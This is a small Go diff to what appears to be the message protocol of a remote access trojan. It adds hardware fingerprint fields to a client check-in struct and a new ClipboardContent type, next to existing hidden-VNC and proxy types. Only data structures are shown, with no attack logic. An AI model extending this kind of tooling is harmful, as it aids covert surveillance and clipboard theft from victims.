@@ -15,6 +15,10 @@ type Hello struct {
 	BuildTag    string        `msgpack:"buildTag,omitempty"`
 	PublicKey   string        `msgpack:"publicKey,omitempty"`
 	Signature   string        `msgpack:"signature,omitempty"`
+	InMemory    bool          `msgpack:"inMemory,omitempty"`
+	CPU         string        `msgpack:"cpu,omitempty"`
+	GPU         string        `msgpack:"gpu,omitempty"`
+	RAM         string        `msgpack:"ram,omitempty"`
 }
 
 type EnrollmentChallenge struct {
@@ -226,6 +230,12 @@ type HVNCLookupResult struct {
 	Exe  string `msgpack:"exe"`
 	Path string `msgpack:"path"`
 	Done bool   `msgpack:"done"`
+}
+
+type ClipboardContent struct {
+	Type   string `msgpack:"type"`
+	Text   string `msgpack:"text"`
+	Source string `msgpack:"source"`
 }
 
 type ProxyData struct {
